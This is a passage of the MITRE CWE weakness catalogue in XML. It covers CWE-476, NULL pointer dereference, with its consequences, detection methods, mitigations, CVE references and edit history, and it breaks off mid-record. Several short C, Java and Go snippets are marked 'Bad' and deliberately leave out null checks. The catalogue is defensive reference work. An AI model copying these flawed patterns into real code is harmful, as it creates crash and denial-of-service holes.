			<ns0:Previous_Entry_Name Date="2022-06-28">Inconsistent Interpretation of HTTP Requests ('HTTP Request Smuggling')</ns0:Previous_Entry_Name>
         </ns0:Content_History>
      </ns0:Weakness>
      <ns0:Weakness ID="476" Name="NULL Pointer Dereference" Abstraction="Base" Structure="Simple" Status="Stable">
         <ns0:Description>A NULL pointer dereference occurs when the application dereferences a pointer that it expects to be valid, but is NULL, typically causing a crash or exit.</ns0:Description>
         <ns0:Extended_Description>NULL pointer dereference issues can occur through a number of flaws, including race conditions, and simple programming omissions.</ns0:Extended_Description>
         <ns0:Related_Weaknesses>
            <ns0:Related_Weakness Nature="ChildOf" CWE_ID="710" View_ID="1000" Ordinal="Primary" />
            <ns0:Related_Weakness Nature="ChildOf" CWE_ID="754" View_ID="1000" />
            <ns0:Related_Weakness Nature="ChildOf" CWE_ID="754" View_ID="1003" Ordinal="Primary" />
         </ns0:Related_Weaknesses>
         <ns0:Weakness_Ordinalities>
            <ns0:Weakness_Ordinality>
               <ns0:Ordinality>Resultant</ns0:Ordinality>
               <ns0:Description>NULL pointer dereferences are frequently resultant from rarely encountered error conditions, since these are most likely to escape detection during the testing phases.</ns0:Description>
            </ns0:Weakness_Ordinality>
         </ns0:Weakness_Ordinalities>
         <ns0:Applicable_Platforms>
            <ns0:Language Name="C" Prevalence="Undetermined" />
            <ns0:Language Name="C++" Prevalence="Undetermined" />
            <ns0:Language Name="Java" Prevalence="Undetermined" />
            <ns0:Language Name="C#" Prevalence="Undetermined" />
            <ns0:Language Name="Go" Prevalence="Undetermined" />
         </ns0:Applicable_Platforms>
         <ns0:Alternate_Terms>
            <ns0:Alternate_Term>
               <ns0:Term>NPD</ns0:Term>
            </ns0:Alternate_Term>
            <ns0:Alternate_Term>
               <ns0:Term>null deref</ns0:Term>
            </ns0:Alternate_Term>
            <ns0:Alternate_Term>
               <ns0:Term>nil pointer dereference</ns0:Term>
               <ns0:Description>used for access of nil in Go programs</ns0:Description>
            </ns0:Alternate_Term>
         </ns0:Alternate_Terms>
         <ns0:Modes_Of_Introduction>
            <ns0:Introduction>
               <ns0:Phase>Implementation</ns0:Phase>
            </ns0:Introduction>
         </ns0:Modes_Of_Introduction>
         <ns0:Likelihood_Of_Exploit>Medium</ns0:Likelihood_Of_Exploit>
         <ns0:Common_Consequences>
            <ns0:Consequence>
               <ns0:Scope>Availability</ns0:Scope>
               <ns0:Impact>DoS: Crash, Exit, or Restart</ns0:Impact>
               <ns0:Note>NULL pointer dereferences usually result in the failure of the process unless exception handling (on some platforms) is available and implemented. Even when exception handling is being used, it can still be very difficult to return the software to a safe state of operation.</ns0:Note>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Integrity</ns0:Scope>
               <ns0:Scope>Confidentiality</ns0:Scope>
               <ns0:Scope>Availability</ns0:Scope>
               <ns0:Impact>Execute Unauthorized Code or Commands</ns0:Impact>
               <ns0:Impact>Read Memory</ns0:Impact>
               <ns0:Impact>Modify Memory</ns0:Impact>
               <ns0:Note>In rare circumstances, when NULL is equivalent to the 0x0 memory address and privileged code can access it, then writing or reading memory is possible, which may lead to code execution.</ns0:Note>
            </ns0:Consequence>
         </ns0:Common_Consequences>
         <ns0:Detection_Methods>
            <ns0:Detection_Method Detection_Method_ID="DM-2">
               <ns0:Method>Automated Dynamic Analysis</ns0:Method>
               <ns0:Description>This weakness can be detected using dynamic tools and techniques that interact with the software using large test suites with many diverse inputs, such as fuzz testing (fuzzing), robustness testing, and fault injection. The software's operation may slow down, but it should not become unstable, crash, or generate incorrect results.</ns0:Description>
               <ns0:Effectiveness>Moderate</ns0:Effectiveness>
            </ns0:Detection_Method>
            <ns0:Detection_Method Detection_Method_ID="DM-12">
               <ns0:Method>Manual Dynamic Analysis</ns0:Method>
               <ns0:Description>Identify error conditions that are not likely to occur during normal usage and trigger them. For example, run the program under low memory conditions, run with insufficient privileges or permissions, interrupt a transaction before it is completed, or disable connectivity to basic network services such as DNS. Monitor the software for any unexpected behavior. If you trigger an unhandled exception or similar error that was discovered and handled by the application's environment, it may still indicate unexpected conditions that were not handled by the application itself.</ns0:Description>
            </ns0:Detection_Method>
           <ns0:Detection_Method Detection_Method_ID="DM-14">
             <ns0:Method>Automated Static Analysis</ns0:Method>
             <ns0:Description>Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect "sources" (origins of input) with "sinks" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)</ns0:Description>
             <ns0:Effectiveness>High</ns0:Effectiveness>
           </ns0:Detection_Method>
         </ns0:Detection_Methods>
         <ns0:Potential_Mitigations>
            <ns0:Mitigation>
               <ns0:Phase>Implementation</ns0:Phase>
               <ns0:Description>If all pointers that could have been modified are sanity-checked previous to use, nearly all NULL pointer dereferences can be prevented.</ns0:Description>
            </ns0:Mitigation>
            <ns0:Mitigation>
               <ns0:Phase>Requirements</ns0:Phase>
               <ns0:Description>The choice could be made to use a language that is not susceptible to these issues.</ns0:Description>
            </ns0:Mitigation>
            <ns0:Mitigation>
               <ns0:Phase>Implementation</ns0:Phase>
               <ns0:Description>Check the results of all functions that return a value and verify that the value is non-null before acting upon it.</ns0:Description>
               <ns0:Effectiveness>Moderate</ns0:Effectiveness>
               <ns0:Effectiveness_Notes>Checking the return value of the function will typically be sufficient, however beware of race conditions (CWE-362) in a concurrent environment. This solution does not handle the use of improperly initialized variables (CWE-665).</ns0:Effectiveness_Notes>
            </ns0:Mitigation>
            <ns0:Mitigation>
               <ns0:Phase>Architecture and Design</ns0:Phase>
               <ns0:Description>Identify all variables and data stores that receive information from external sources, and apply input validation to make sure that they are only initialized to expected values.</ns0:Description>
            </ns0:Mitigation>
            <ns0:Mitigation>
               <ns0:Phase>Implementation</ns0:Phase>
               <ns0:Description>Explicitly initialize all your variables and other data stores, either during declaration or just before the first usage.</ns0:Description>
            </ns0:Mitigation>
            <ns0:Mitigation>
               <ns0:Phase>Testing</ns0:Phase>
               <ns0:Description>Use automated static analysis tools that target this type of weakness. Many modern techniques use data flow analysis to minimize the number of false positives. This is not a perfect solution, since 100% accuracy and coverage are not feasible.</ns0:Description>
            </ns0:Mitigation>
         </ns0:Potential_Mitigations>
         <ns0:Demonstrative_Examples>
            <ns0:Demonstrative_Example>
               <ns0:Intro_Text>While there are no complete fixes aside from conscientious programming, the following steps will go a long way to ensure that NULL pointer dereferences do not occur.</ns0:Intro_Text>
               <ns0:Example_Code Nature="Good">
                  <html:div>if (pointer1 != NULL) {<html:div style="margin-left:1em;">
                        <html:div>
                           <html:br />
                           <html:i>/* make use of pointer1 */</html:i>
                           <html:br />
                           <html:br />
                           <html:i>/* ... */</html:i>
                           <html:br />
                        </html:div>
                     </html:div>}</html:div>
               </ns0:Example_Code>
               <ns0:Body_Text>If you are working with a multithreaded or otherwise asynchronous environment, ensure that proper locking APIs are used to lock before the if statement; and unlock when it has finished.</ns0:Body_Text>
            </ns0:Demonstrative_Example>
            <ns0:Demonstrative_Example Demonstrative_Example_ID="DX-1">
               <ns0:Intro_Text>This example takes an IP address from a user, verifies that it is well formed and then looks up the hostname and copies it into a buffer.</ns0:Intro_Text>
               <ns0:Example_Code Nature="Bad" Language="C">
                  <html:div>void host_lookup(char *user_supplied_addr){<html:div style="margin-left:1em;">
                        <html:div>struct hostent *hp;<html:br />in_addr_t *addr;<html:br />char hostname[64];<html:br />in_addr_t inet_addr(const char *cp);<html:br />
                           <html:br />
                           <html:i>/*routine that ensures user_supplied_addr is in the right format for conversion */</html:i>
                           <html:br />
                           <html:br />validate_addr_form(user_supplied_addr);<html:br />addr = inet_addr(user_supplied_addr);<html:br />hp = gethostbyaddr( addr, sizeof(struct in_addr), AF_INET);<html:br />strcpy(hostname, hp-&gt;h_name);</html:div>
                     </html:div>}</html:div>
               </ns0:Example_Code>
               <ns0:Body_Text>If an attacker provides an address that appears to be well-formed, but the address does not resolve to a hostname, then the call to gethostbyaddr() will return NULL. Since the code does not check the return value from gethostbyaddr (CWE-252), a NULL pointer dereference (CWE-476) would then occur in the call to strcpy().</ns0:Body_Text>
               <ns0:Body_Text>Note that this code is also vulnerable to a buffer overflow (CWE-119).</ns0:Body_Text>
            </ns0:Demonstrative_Example>
            <ns0:Demonstrative_Example>
               <ns0:Intro_Text>In the following code, the programmer assumes that the system always has a property named "cmd" defined. If an attacker can control the program's environment so that "cmd" is not defined, the program throws a NULL pointer exception when it attempts to call the trim() method.</ns0:Intro_Text>
               <ns0:Example_Code Nature="Bad" Language="Java">
                  <html:div>String cmd = System.getProperty("cmd");<html:br />cmd = cmd.trim();</html:div>
               </ns0:Example_Code>
            </ns0:Demonstrative_Example>
            <ns0:Demonstrative_Example Demonstrative_Example_ID="DX-110">
               <ns0:Intro_Text>This Android application has registered to handle a URL when sent an intent:</ns0:Intro_Text>
               <ns0:Example_Code Nature="Bad" Language="Java">
                  <html:div>
                     <html:br />
                     <html:i>...</html:i>
                     <html:br />IntentFilter filter = new IntentFilter("com.example.URLHandler.openURL");<html:br />MyReceiver receiver = new MyReceiver();<html:br />registerReceiver(receiver, filter);<html:br />
                     <html:i>...</html:i>
                     <html:br />
                     <html:br />public class UrlHandlerReceiver extends BroadcastReceiver {<html:div style="margin-left:1em;">
                        <html:div>@Override<html:br />public void onReceive(Context context, Intent intent) {<html:div style="margin-left:1em;">
                              <html:div>if("com.example.URLHandler.openURL".equals(intent.getAction())) {<html:div style="margin-left:1em;">String URL = intent.getStringExtra("URLToOpen");<html:br />int length = URL.length();</html:div>
                                 <html:br />
                                 <html:i>...</html:i>
                                 <html:br />}</html:div>
                           </html:div>}</html:div>
                     </html:div>}</html:div>
               </ns0:Example_Code>
               <ns0:Body_Text>The application assumes the URL will always be included in the intent. When the URL is not present, the call to getStringExtra() will return null, thus causing a null pointer exception when length() is called.</ns0:Body_Text>
            </ns0:Demonstrative_Example>
            <ns0:Demonstrative_Example>
               <ns0:Intro_Text>Consider the following example of a typical client server exchange. The HandleRequest function is intended to perform a request and use a defer to close the connection whenever the function returns.</ns0:Intro_Text>
               <ns0:Example_Code Nature="Bad" Language="Go">
                  <html:div>func HandleRequest(client http.Client, request *http.Request) (*http.Response, error) {
                     <html:div style="margin-left:1em;">
                        response, err := client.Do(request)<html:br />
                        defer response.Body.Close()<html:br />
                        if err != nil {
                           <html:div style="margin-left:1em;">
                              return nil, err<html:br />
                           </html:div>
                        }<html:br />...<html:br /></html:div>
                     }</html:div>
               </ns0:Example_Code>
               <ns0:Body_Text>If a user supplies a malformed request or violates the client policy, the Do method can return a nil response and a non-nil err.</ns0:Body_Text>
               <ns0:Body_Text>This HandleRequest Function evaluates the close before checking the error. A deferred call's arguments are evaluated immediately, so the defer statement panics due to a nil response.</ns0:Body_Text>
            </ns0:Demonstrative_Example>
         </ns0:Demonstrative_Examples>
         <ns0:Observed_Examples>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2005-3274</ns0:Reference>
               <ns0:Description>race condition causes a table to be corrupted if a timer activates while it is being modified, leading to resultant NULL dereference; also involves locking.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2005-3274</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2002-1912</ns0:Reference>
               <ns0:Description>large number of packets leads to NULL dereference</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2002-1912</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2005-0772</ns0:Reference>
               <ns0:Description>packet with invalid error status value triggers NULL dereference</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2005-0772</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2009-4895</ns0:Reference>
               <ns0:Description>Chain: race condition for an argument value, possibly resulting in NULL dereference</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2009-4895</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2020-29652</ns0:Reference>
               <ns0:Description>ssh component for Go allows clients to cause a denial of service (nil pointer dereference) against SSH servers.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2020-29652</ns0:Link>
            </ns0:Observed_Example>
	   <ns0:Observed_Example>
	     <ns0:Reference>CVE-2009-2692</ns0:Reference>
	     <ns0:Description>Chain: Use of an unimplemented network socket operation pointing to an uninitialized handler function (CWE-456) causes a crash because of a null pointer dereference (CWE-476).</ns0:Description>
	     <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2009-2692</ns0:Link>
	   </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2009-3547</ns0:Reference>
               <ns0:Description>Chain: race condition might allow resource to be released before operating on it, leading to NULL dereference</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2009-3547</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2009-3620</ns0:Reference>
               <ns0:Description>Chain: some unprivileged ioctls do not verify that a structure has been initialized before invocation, leading to NULL dereference</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2009-3620</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2009-2698</ns0:Reference>
               <ns0:Description>Chain: IP and UDP layers each track the same value with different mechanisms that can get out of sync, possibly resulting in a NULL dereference</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2009-2698</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2009-2692</ns0:Reference>
               <ns0:Description>Chain: uninitialized function pointers can be dereferenced allowing code execution</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2009-2692</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2009-0949</ns0:Reference>
               <ns0:Description>Chain: improper initialization of memory can lead to NULL dereference</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2009-0949</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2008-3597</ns0:Reference>
               <ns0:Description>Chain: game server can access player data structures before initialization has happened leading to NULL dereference</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2008-3597</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2020-6078</ns0:Reference>
               <ns0:Description>Chain: The return value of a function returning a pointer is not checked for success (CWE-252) resulting in the later use of an uninitialized variable (CWE-456) and a null pointer dereference (CWE-476)</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2020-6078</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2008-0062</ns0:Reference>
               <ns0:Description>Chain: a message having an unknown message type may cause a reference to uninitialized memory resulting in a null pointer dereference (CWE-476) or dangling pointer (CWE-825), possibly crashing the system or causing heap corruption.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2008-0062</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2008-5183</ns0:Reference>
               <ns0:Description>Chain: unchecked return value can lead to NULL dereference</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2008-5183</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2004-0079</ns0:Reference>
               <ns0:Description>SSL software allows remote attackers to cause a denial of service (crash) via a crafted SSL/TLS handshake that triggers a null dereference.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2004-0079</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2004-0365</ns0:Reference>
               <ns0:Description>Network monitor allows remote attackers to cause a denial of service (crash) via a malformed RADIUS packet that triggers a null dereference.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2004-0365</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2003-1013</ns0:Reference>
               <ns0:Description>Network monitor allows remote attackers to cause a denial of service (crash) via a malformed Q.931, which triggers a null dereference.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2003-1013</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2003-1000</ns0:Reference>
               <ns0:Description>Chat client allows remote attackers to cause a denial of service (crash) via a passive DCC request with an invalid ID number, which causes a null dereference.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2003-1000</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2004-0389</ns0:Reference>
               <ns0:Description>Server allows remote attackers to cause a denial of service (crash) via malformed requests that trigger a null dereference.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2004-0389</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2004-0119</ns0:Reference>
               <ns0:Description>OS allows remote attackers to cause a denial of service (crash from null dereference) or execute arbitrary code via a crafted request during authentication protocol selection.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2004-0119</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2004-0458</ns0:Reference>
               <ns0:Description>Game allows remote attackers to cause a denial of service (server crash) via a missing argument, which triggers a null pointer dereference.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2004-0458</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2002-0401</ns0:Reference>
               <ns0:Description>Network monitor allows remote attackers to cause a denial of service (crash) or execute arbitrary code via malformed packets that cause a NULL pointer dereference.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2002-0401</ns0:Link>
            </ns0:Observed_Example>
         </ns0:Observed_Examples>
         <ns0:Taxonomy_Mappings>
            <ns0:Taxonomy_Mapping Taxonomy_Name="7 Pernicious Kingdoms">
               <ns0:Entry_Name>Null Dereference</ns0:Entry_Name>
            </ns0:Taxonomy_Mapping>
            <ns0:Taxonomy_Mapping Taxonomy_Name="CLASP">
               <ns0:Entry_Name>Null-pointer dereference</ns0:Entry_Name>
            </ns0:Taxonomy_Mapping>
            <ns0:Taxonomy_Mapping Taxonomy_Name="PLOVER">
               <ns0:Entry_Name>Null Dereference (Null Pointer Dereference)</ns0:Entry_Name>
            </ns0:Taxonomy_Mapping>
            <ns0:Taxonomy_Mapping Taxonomy_Name="OWASP Top Ten 2004">
               <ns0:Entry_ID>A9</ns0:Entry_ID>
               <ns0:Entry_Name>Denial of Service</ns0:Entry_Name>
               <ns0:Mapping_Fit>CWE More Specific</ns0:Mapping_Fit>
            </ns0:Taxonomy_Mapping>
            <ns0:Taxonomy_Mapping Taxonomy_Name="CERT C Secure Coding">
               <ns0:Entry_ID>EXP34-C</ns0:Entry_ID>
               <ns0:Entry_Name>Do not dereference null pointers</ns0:Entry_Name>
               <ns0:Mapping_Fit>Exact</ns0:Mapping_Fit>
            </ns0:Taxonomy_Mapping>
            <ns0:Taxonomy_Mapping Taxonomy_Name="Software Fault Patterns">
               <ns0:Entry_ID>SFP7</ns0:Entry_ID>
               <ns0:Entry_Name>Faulty Pointer Use</ns0:Entry_Name>
            </ns0:Taxonomy_Mapping>
         </ns0:Taxonomy_Mappings>
         <ns0:References>
            <ns0:Reference External_Reference_ID="REF-6" />
            <ns0:Reference External_Reference_ID="REF-18" />
            <ns0:Reference External_Reference_ID="REF-1031" />
            <ns0:Reference External_Reference_ID="REF-1032" />
            <ns0:Reference External_Reference_ID="REF-1033" />
         </ns0:References>
         <ns0:Mapping_Notes>
            <ns0:Usage>Allowed</ns0:Usage>
            <ns0:Rationale>This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.</ns0:Rationale>
            <ns0:Comments>Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.</ns0:Comments>
            <ns0:Reasons>
               <ns0:Reason Type="Acceptable-Use" />
            </ns0:Reasons>
         </ns0:Mapping_Notes>
         <ns0:Content_History>
            <ns0:Submission>
               <ns0:Submission_Name>7 Pernicious Kingdoms</ns0:Submission_Name>
               <ns0:Submission_Date>2006-07-19</ns0:Submission_Date>
               <ns0:Submission_Version>Draft 3</ns0:Submission_Version>
               <ns0:Submission_ReleaseDate>2006-07-19</ns0:Submission_ReleaseDate>
            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Name>Eric Dalci</ns0:Modification_Name>
               <ns0:Modification_Organization>Cigital</ns0:Modification_Organization>
               <ns0:Modification_Date>2008-07-01</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Time_of_Introduction</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Organization>KDM Analytics</ns0:Modification_Organization>
               <ns0:Modification_Date>2008-08-01</ns0:Modification_Date>
               <ns0:Modification_Comment>added/updated white box definitions</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2008-09-08</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Applicable_Platforms, Common_Consequences, Relationships, Other_Notes, Taxonomy_Mappings, Weakness_Ordinalities</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2008-11-24</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Relationships, Taxonomy_Mappings</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2009-05-27</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Demonstrative_Examples</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2009-10-29</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2009-12-28</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Common_Consequences, Demonstrative_Examples, Other_Notes, Potential_Mitigations, Weakness_Ordinalities</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2010-02-16</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Potential_Mitigations, Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2010-06-21</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Demonstrative_Examples, Description, Detection_Factors, Potential_Mitigations</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2010-09-27</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Demonstrative_Examples, Observed_Examples, Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2010-12-13</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2011-06-01</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Common_Consequences</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2011-06-27</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Related_Attack_Patterns, Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2011-09-13</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Relationships, Taxonomy_Mappings</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2012-05-11</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Observed_Examples, Related_Attack_Patterns, Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2014-02-18</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Demonstrative_Examples</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2014-07-30</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Relationships, Taxonomy_Mappings</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2015-12-07</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2017-01-19</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2017-11-08</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Relationships, Taxonomy_Mappings, White_Box_Definitions</ns0:Modification_Comment>
            </ns0:Modification>
				<ns0:Modification>
					<ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
					<ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
					<ns0:Modification_Date>2019-01-03</ns0:Modification_Date>
					<ns0:Modification_Comment>updated Relationships</ns0:Modification_Comment>
				</ns0:Modification>
				<ns0:Modification>
					<ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
					<ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
					<ns0:Modification_Date>2019-06-20</ns0:Modification_Date>
					<ns0:Modification_Comment>updated Relationships</ns0:Modification_Comment>
				</ns0:Modification>
				<ns0:Modification>
					<ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
					<ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
					<ns0:Modification_Date>2019-09-19</ns0:Modification_Date>
					<ns0:Modification_Comment>updated References, Relationships</ns0:Modification_Comment>
				</ns0:Modification>
				<ns0:Modification>
					<ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
					<ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
					<ns0:Modification_Date>2020-02-24</ns0:Modification_Date>
					<ns0:Modification_Comment>updated References</ns0:Modification_Comment>
				</ns0:Modification>
				<ns0:Modification>
					<ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
					<ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
					<ns0:Modification_Date>2020-06-25</ns0:Modification_Date>
					<ns0:Modification_Comment>updated Common_Consequences</ns0:Modification_Comment>
				</ns0:Modification>
				<ns0:Modification>
					<ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
					<ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
					<ns0:Modification_Date>2020-08-20</ns0:Modification_Date>
					<ns0:Modification_Comment>updated Relationships</ns0:Modification_Comment>
				</ns0:Modification>
				<ns0:Modification>
					<ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
					<ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
					<ns0:Modification_Date>2020-12-10</ns0:Modification_Date>
					<ns0:Modification_Comment>updated Relationships</ns0:Modification_Comment>
				</ns0:Modification>
				<ns0:Modification>
					<ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
					<ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
